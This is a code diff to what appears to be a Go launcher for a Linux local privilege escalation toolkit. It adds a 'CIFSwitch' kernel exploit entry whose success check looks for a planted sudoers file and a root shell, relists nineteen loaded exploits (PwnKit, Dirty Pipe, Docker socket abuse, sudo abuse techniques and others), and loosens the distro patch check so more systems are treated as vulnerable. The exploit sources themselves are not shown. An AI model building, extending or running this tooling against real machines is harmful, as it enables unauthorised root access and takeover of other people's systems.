@@ -313,6 +313,33 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 			SuccessCheck: func() bool { return true },
 		},
 		{
+			Name:        "cifswitch",
+			Filename:    "cifswitch.c",
+			Description: "CVE-2026-46243: CIFSwitch - cifs.spnego + NSS namespace confusion",
+			Introduced:  "2.6.19",
+			FixedIn:     []string{"6.18.32", "7.1"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall"},
+			SkipCheck: func() bool {
+				_, err := exec.LookPath("gcc")
+				if err != nil { return true }
+				if _, err := os.Stat("/usr/sbin/cifs.upcall"); err != nil {
+					if _, err := os.Stat("/sbin/cifs.upcall"); err != nil {
+						return true
+					}
+				}
+				return false
+			},
+			SuccessCheck: func() bool {
+				if _, err := os.Stat("/etc/sudoers.d/cifswitch_pwn"); err == nil {
+					return true
+				}
+				if _, err := os.Stat("/var/tmp/cifswitch_rootsh"); err == nil {
+					return true
+				}
+				return false
+			},
+		},
+		{
 			Name:        "cve_2025_38352",
 			Filename:    "cve_2025_38352.c",
 			Description: "CVE-2025-38352: POSIX CPU timer race + page-cache overwrite -> root",
@@ -705,7 +732,7 @@ func (tk *Toolkit) Run() {
 	if !tk.quiet {
 		fmt.Printf(`
 ╔══════════════════════════════════════════════════════════╗
-║      Linux LPE Toolkit - 18 exploits loaded              ║
+║      Linux LPE Toolkit - 19 exploits loaded              ║
 ╠══════════════════════════════════════════════════════════╣
 ║  1. Copy Fail      CVE-2026-31431   AF_ALG + splice    ║
 ║  2. Dirty Frag     CVE-2026-43284   xfrm-ESP/RxRPC     ║
@@ -714,17 +741,18 @@ func (tk *Toolkit) Run() {
 ║  5. Fragnesia v2   skb_segment      GRO coalesce       ║
 ║  6. PinTheft       RDS zcopy        io_uring overwrite ║
 ║  7. Dirty Pipe     CVE-2022-0847   /etc/passwd overwr  ║
-║  8. PwnKit         CVE-2021-4034   pkexec env escape  ║
-║  9. OverlayFS      CVE-2021-3493   user-ns mount      ║
-║ 10. OvFS+FUSE      CVE-2023-0386   FUSE mount escape  ║
-║ 11. Polkit D-Bus   CVE-2021-3560   accounts-daemon    ║
-║ 12. Docker Socket  (misconfig)     docker.sock abuse  ║
-║ 13. netfilter OOB  CVE-2021-22555  ip_tables corrupt  ║
-║ 14. nft UAF2       CVE-2022-2586   nftables chain     ║
-║ 15. pidfd race     CVE-2026-46333  ssh-keysign/shadow ║
-║ 16. CPU Timer Race CVE-2025-38352  POSIX timer race   ║
-║ 17. nft UAF        CVE-2024-1086   Notselwyn multi-f  ║
-║ 18. GTFOBins       sudo abuse      80+ techniques      ║
+║  8. CIFSwitch      CVE-2026-46243  cifs.spnego NSS     ║
+║  9. PwnKit         CVE-2021-4034   pkexec env escape  ║
+║ 10. OverlayFS      CVE-2021-3493   user-ns mount      ║
+║ 11. OvFS+FUSE      CVE-2023-0386   FUSE mount escape  ║
+║ 12. Polkit D-Bus   CVE-2021-3560   accounts-daemon    ║
+║ 13. Docker Socket  (misconfig)     docker.sock abuse  ║
+║ 14. netfilter OOB  CVE-2021-22555  ip_tables corrupt  ║
+║ 15. nft UAF2       CVE-2022-2586   nftables chain     ║
+║ 16. pidfd race     CVE-2026-46333  ssh-keysign/shadow ║
+║ 17. CPU Timer Race CVE-2025-38352  POSIX timer race   ║
+║ 18. nft UAF        CVE-2024-1086   Notselwyn multi-f  ║
+║ 19. GTFOBins       sudo abuse      80+ techniques      ║
 ╚══════════════════════════════════════════════════════════╝
 
 [*] Detected kernel: %s
@@ -925,6 +953,21 @@ func (tk *Toolkit) isDistroSupported(exp Exploit, distro DistroInfo, kv KernelVe
 	}
 	extra := distroExtraFixed(distro, kv)
 	if len(extra) == 0 {
+		return true
+	}
+	// Only apply distro-specific fix check if the exploit's FixedIn contains
+	// a version in the same kernel branch as the distro's kernel.
+	// e.g., a 5.15.0-xxx Ubuntu backport is not relevant for an exploit
+	// fixed only in 6.18.x.
+	matchesBranch := false
+	for _, f := range exp.FixedIn {
+		fv := parseKernelVersion(f)
+		if fv.Valid && fv.Major == kv.Major && fv.Minor == kv.Minor {
+			matchesBranch = true
+			break
+		}
+	}
+	if !matchesBranch {
 		return true
 	}
 	fullVersion := tk.kernelVersion()
